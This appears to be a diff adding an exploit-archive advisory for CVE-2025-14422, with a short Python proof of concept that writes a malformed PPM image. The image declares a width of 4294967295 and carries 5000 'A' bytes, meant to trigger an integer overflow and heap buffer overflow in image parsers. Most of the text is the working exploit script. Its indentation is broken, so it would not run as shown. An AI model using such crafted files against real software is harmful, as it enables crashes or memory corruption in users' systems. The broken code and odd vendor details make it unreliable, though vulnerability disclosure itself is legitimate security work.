@@ -1,0 +1,44 @@
+=============================================================================================================================================
+| # Title     : Heap Buffer Overflow PoC via Malformed PPM Image Header                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://redhat.com/                                                                                                         |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214569/ & CVE-2025-14422
+
+[+] Summary    : This Proof of Concept generates a crafted binary PPM (P6) image with extreme width and height values designed to trigger an integer overflow during memory size calculation (width × height × 3). 
+                 The resulting undersized allocation can lead to a heap buffer overflow when image data is processed, potentially causing a crash in vulnerable image parsers. 
+				 The script writes a malformed header followed by oversized payload data to demonstrate the issue in unpatched environments.
+
+[+] POC : python poc.py
+
+
+def generate_poc():
+   
+    filename = "exploit_trigger.ppm"
+  
+  width = "4294967295"  
+    height = "2"
+    max_color = "255"
+   
+    header = f"P6\n{width} {height}\n{max_color}\n".encode()
+  
+    payload = b"\x41" * 5000
+    
+    try:
+        with open(filename, "wb") as f:
+            f.write(header)
+            f.write(payload)
+        print(f"[+] Successfully generated {filename}")
+        print("[!] Warning: Opening this file in an unpatched version may cause a crash.")
+    except IOError as e:
+        print(f"[-] Error writing file: {e}")
+
+if __name__ == "__main__":
+    generate_poc()
+
+		
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
